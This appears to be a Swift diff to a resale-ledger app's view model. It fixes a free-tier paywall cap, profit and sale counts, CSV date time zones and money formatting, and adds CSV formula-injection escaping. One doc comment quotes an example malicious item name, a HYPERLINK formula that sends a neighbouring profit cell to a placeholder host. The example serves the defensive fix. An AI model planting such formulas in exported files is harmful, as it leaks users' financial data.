@@ -70,11 +70,62 @@ final class FlipsViewModel {
 
     private func effectiveDate(_ r: ScanResult) -> Date { r.soldDate ?? r.timestamp }
 
+    /// The free tier's row cap, applied to *sold* rows only.
+    ///
+    /// It used to be `prefix(cap)` over the whole visible list. That list is
+    /// owned + listed + sold ordered by `soldDate ?? timestamp` descending, so
+    /// ten items scanned and marked Owned today outranked last week's two
+    /// sales, filled the cap, and pushed both sales past it: a free user with
+    /// two sold flips against a ten-sold allowance saw neither of them, and an
+    /// "Unlock 2 more" row in their place. `Config.ledgerFreeSoldCap`'s own
+    /// doc comment, this view's, and AUDIT-2026-09-07 all describe the gate as
+    /// the most recent N *sold*.
+    ///
+    /// Which sales are kept is decided by recency and not by `sort`, so
+    /// changing the sort re-orders the ledger without moving rows across the
+    /// paywall — the rows come back in `visible`'s order either way, because
+    /// `filter` preserves it.
+    ///
+    /// `hiddenSold` counts only the sales withheld. Nothing else is ever
+    /// withheld now, so it is the whole of what "unlock" buys in this list.
+    func freeTierItems(_ visible: [ScanResult],
+                       cap: Int = Config.ledgerFreeSoldCap)
+    -> (rows: [ScanResult], hiddenSold: Int) {
+        let sold = visible.filter { $0.status == .sold }
+        guard sold.count > cap else { return (visible, 0) }
+        let kept = Set(
+            sold.sorted { effectiveDate($0) > effectiveDate($1) }
+                .prefix(cap)
+                .map(\.id)
+        )
+        let rows = visible.filter { $0.status != .sold || kept.contains($0.id) }
+        return (rows, sold.count - cap)
+    }
+
     // ── Summary ────────────────────────────────────────────────────────────────
 
     struct Summary {
         var realizedProfit: Decimal = 0
+        /// Everything sold in scope, priced or not.
         var itemsSold: Int = 0
+        /// The subset `realizedProfit` is actually the profit *of*. Smaller
+        /// than `itemsSold` by exactly the sales with no paid price.
+        var itemsPriced: Int = 0
+
+        /// Whether the headline figure covers every sale it sits above.
+        var profitCoversEverySale: Bool { itemsPriced == itemsSold }
+
+        /// How the sold count should read under a profit total, given that
+        /// some of those sales may not be in it.
+        ///
+        /// Split out so the header and the shareable month card cannot drift:
+        /// they render the same two numbers and there is nowhere else the gap
+        /// can show.
+        var soldLabel: String {
+            let sales = "\(itemsSold) item\(itemsSold == 1 ? "" : "s") sold"
+            guard !profitCoversEverySale else { return sales }
+            return "\(sales) · \(itemsSold - itemsPriced) needs a paid price"
+        }
         var totalInvested: Decimal = 0
         var averageROI: Decimal?          // fraction, e.g. 0.42
         var bestFlip: ScanResult?
@@ -88,8 +139,23 @@ final class FlipsViewModel {
         let sold = all.filter { $0.status == .sold }
         let scopedSold = scope == .month ? sold.filter { isInCurrentMonth($0.soldDate) } : sold
 
+        // Two counts, because they are two different facts.
+        //
+        // `realizedProfit` is nil without a paid price, and dropping those rows
+        // from the sum rather than guessing a cost basis is deliberate and
+        // tested. Pairing that sum with a count taken over the *larger* set was
+        // not: one uncosted sale rendered as "+$0" above "1 item sold", which
+        // reads as having sold something for nothing rather than as a missing
+        // number — and with two sales, one uncosted, the headline quietly
+        // understates real profit with nothing on screen to say so.
+        //
+        // In the list the gap is already visible (the row shows "—" and says
+        // "Profit unknown — add what you paid"). The header and the share card
+        // show only totals, so they need the count to carry it.
         s.itemsSold = scopedSold.count
-        s.realizedProfit = scopedSold.compactMap(\.realizedProfit).reduce(0, +)
+        let priced = scopedSold.compactMap(\.realizedProfit)
+        s.itemsPriced = priced.count
+        s.realizedProfit = priced.reduce(0, +)
 
         let rois = scopedSold.compactMap(\.roi)
         s.averageROI = rois.isEmpty ? nil : rois.reduce(0, +) / Decimal(rois.count)
@@ -147,10 +213,18 @@ final class FlipsViewModel {
     func renderMonthCard(_ all: [ScanResult]) -> UIImage? {
         guard hasSalesThisMonth(all) else { return nil }
         let s = summary(all, scope: .month)
+        // The card carries the *priced* count, not every sale.
+        //
+        // This is the one surface that leaves the app, so the two numbers on it
+        // have to be of the same thing: a total covering one sale printed above
+        // "2 items sold" is a figure nobody can check. The in-app header says
+        // the other half — which sales still need a paid price — because that
+        // is a note to the owner, not something to post.
+        guard s.itemsPriced > 0 else { return nil }
         let card = MonthShareCardView(
             monthTitle: Self.monthYearLabel(Date()),
             realizedProfit: s.realizedProfit,
-            itemsSold: s.itemsSold,
+            itemsSold: s.itemsPriced,
             bestFlipName: s.bestFlip?.itemName,
             bestFlipProfit: s.bestFlip?.realizedProfit
         )
@@ -169,18 +243,42 @@ final class FlipsViewModel {
         let sold = all.filter { $0.status == .sold }
             .sorted { ($0.soldDate ?? $0.timestamp) < ($1.soldDate ?? $1.timestamp) }
 
-        let iso = ISO8601DateFormatter()
-        iso.formatOptions = [.withFullDate]
+        // A local-calendar day, matching every other date rule in this feature.
+        //
+        // This was an `ISO8601DateFormatter` with only `.withFullDate`, and
+        // that formatter's `timeZone` defaults to **GMT** — so the exported day
+        // was the UTC day while `isInCurrentMonth` and `monthlyBuckets` both
+        // use `Calendar.current`, and the export's own filename via
+        // `fileStamp()` uses the local zone. `soldDate` carries a real
+        // time-of-day (wall-clock `Date()` or a local DatePicker), not a
+        // normalised midnight, so the two disagreed for every sale logged after
+        // 17:00 Pacific or 20:00 Eastern — most evenings, for most of the US
+        // user base. At a month boundary the sale exported into the wrong
+        // month; on 31 December, into the wrong tax year, while the app's own
+        // month card counted it correctly.
+        //
+        // Same construction as `fileStamp()`, so the two cannot drift.
+        let day = DateFormatter()
+        day.locale = Locale(identifier: "en_US_POSIX")
+        day.calendar = Calendar.current
+        day.dateFormat = "yyyy-MM-dd"
 
         var rows = ["Date,Item,Paid,Sold,Fees,Profit,ROI"]
         for r in sold {
-            let date = r.soldDate.map { iso.string(from: $0) } ?? ""
-            let paid = r.paidPrice.map { Self.decimalString($0) } ?? ""
-            let soldStr = r.soldPrice.map { Self.decimalString($0) } ?? ""
-            let fees = r.feesEstimate.map { Self.decimalString($0) } ?? ""
-            let profit = r.realizedProfit.map { Self.decimalString($0) } ?? ""
-            let roi = r.roi.map { Self.roiPercentPlain($0) } ?? ""
-            let cols = [date, r.itemName, paid, soldStr, fees, profit, roi].map(Self.csvEscape)
+            let date = r.soldDate.map { day.string(from: $0) } ?? ""
+            let paid = r.paidPrice.map { Self.moneyColumn($0) } ?? ""
+            let soldStr = r.soldPrice.map { Self.moneyColumn($0) } ?? ""
+            let fees = r.feesEstimate.map { Self.moneyColumn($0) } ?? ""
+            let profit = r.realizedProfit.map { Self.moneyColumn($0) } ?? ""
+            let roi = r.roi.map { Self.roiColumn($0) } ?? ""
+            // Only the item name is free text, and only free text is neutered.
+            // Running the money columns through the same escape would make a
+            // loss ("-12.50") a text cell, and reconciling the file is the
+            // entire point of it.
+            let cols = [Self.csvEscape(date), Self.csvText(r.itemName),
+                        Self.csvEscape(paid), Self.csvEscape(soldStr),
+                        Self.csvEscape(fees), Self.csvEscape(profit),
+                        Self.csvEscape(roi)]
             rows.append(cols.joined(separator: ","))
         }
         return rows.joined(separator: "\r\n") + "\r\n"
@@ -231,17 +329,52 @@ final class FlipsViewModel {
         return Calendar.current.isDate(date, equalTo: Date(), toGranularity: .month)
     }
 
-    private static func decimalString(_ value: Double) -> String {
-        String(format: "%.2f", value)
+    /// Every numeric column at the same scale, in a spreadsheet's own notation.
+    ///
+    /// The columns used to split on overload resolution. `paidPrice`,
+    /// `soldPrice` and `feesEstimate` are `Double?` and went through
+    /// `String(format: "%.2f")`; `realizedProfit` is `Decimal?` and went
+    /// through `NSDecimalNumber.stringValue`, which prints the value's natural
+    /// scale and nothing more. That profit is built by subtracting
+    /// `Decimal(Double)` conversions — the conversion `MarketplaceFees` warns
+    /// "would capture the Double's rounding error" — so the one column an
+    /// accountant actually reconciles was the only money column with no
+    /// guaranteed cent scale: 8.00, 65.00, 9.00 exported a profit of "48".
+    ///
+    /// POSIX and ungrouped on purpose: a locale that groups with a comma would
+    /// put a column break inside a number, and one that uses a decimal comma
+    /// would make every money cell text.
+    private static let csvNumber: NumberFormatter = {
+        let f = NumberFormatter()
+        f.locale = Locale(identifier: "en_US_POSIX")
+        f.numberStyle = .decimal
+        f.usesGroupingSeparator = false
+        f.minimumFractionDigits = 2
+        f.maximumFractionDigits = 2
+        f.roundingMode = .halfUp
+        return f
+    }()
+
+    private static func moneyColumn(_ value: Decimal) -> String {
+        csvNumber.string(from: NSDecimalNumber(decimal: value)) ?? "0.00"
     }
 
-    private static func decimalString(_ value: Decimal) -> String {
-        NSDecimalNumber(decimal: value).stringValue
+    /// The `Double` overload formats the `Double` directly rather than going
+    /// through `Decimal(value)` — that conversion is the lossy one, and there
+    /// is nothing to gain by taking it on the way to two decimal places.
+    private static func moneyColumn(_ value: Double) -> String {
+        csvNumber.string(from: NSNumber(value: value)) ?? "0.00"
     }
 
-    private static func roiPercentPlain(_ fraction: Decimal) -> String {
-        let value = Int((NSDecimalNumber(decimal: fraction).doubleValue * 100).rounded())
-        return "\(value)%"
+    /// ROI to two decimals, so a row can be recomputed from its own columns.
+    ///
+    /// It was `Int((fraction * 100).rounded())`, which exported 0.4249 as
+    /// "42%" — profit ÷ paid from the neighbouring cells does not give 42, so
+    /// the column could not be checked against the file it lives in. Still a
+    /// percent with its sign, because that is what the header says and what a
+    /// spreadsheet reads "42.49%" back as.
+    private static func roiColumn(_ fraction: Decimal) -> String {
+        (csvNumber.string(from: NSDecimalNumber(decimal: fraction * 100)) ?? "0.00") + "%"
     }
 
     private static func monthLabel(_ date: Date) -> String {
@@ -267,5 +400,28 @@ final class FlipsViewModel {
             return field
         }
         return "\"" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
+    }
+
+    /// Characters a spreadsheet reads as "this cell is a formula".
+    static let csvFormulaLeads: Set<Character> = ["=", "+", "-", "@", "\t", "\r"]
+
+    /// A free-text field, made safe to open.
+    ///
+    /// RFC-4180 quoting is not a defence. Excel, Numbers and LibreOffice strip
+    /// the quotes on import and then evaluate any cell whose first character is
+    /// one of `csvFormulaLeads`. The Item column is model-generated from
+    /// whatever text was visible on the label and is user-editable, so
+    /// `=HYPERLINK("http://x/?"&C2,"click")` as an item name becomes a live
+    /// formula that reads the profit cell next to it — in the one file in this
+    /// product a user is likely to forward to an accountant.
+    ///
+    /// A leading apostrophe is the standard neutering: spreadsheets take it as
+    /// "the rest is text". It costs a visible `'` on the rare honest name that
+    /// starts with a dash, which is the right side of that trade.
+    static func csvText(_ field: String) -> String {
+        guard let first = field.first, csvFormulaLeads.contains(first) else {
+            return csvEscape(field)
+        }
+        return "\"'" + field.replacingOccurrences(of: "\"", with: "\"\"") + "\""
     }
 }
